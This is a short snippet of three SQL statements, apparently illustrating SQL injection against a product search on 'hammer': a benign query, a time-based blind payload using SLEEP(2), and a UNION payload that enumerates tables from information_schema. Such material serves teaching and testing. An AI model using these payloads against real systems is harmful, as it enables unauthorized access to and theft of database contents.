SELECT ? FROM ? WHERE ? LIKE '%hammer'; 

SELECT ? FROM ? WHERE ? LIKE '%hammer' AND 1 = SLEEP(2);-- 

SELECT ? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);--
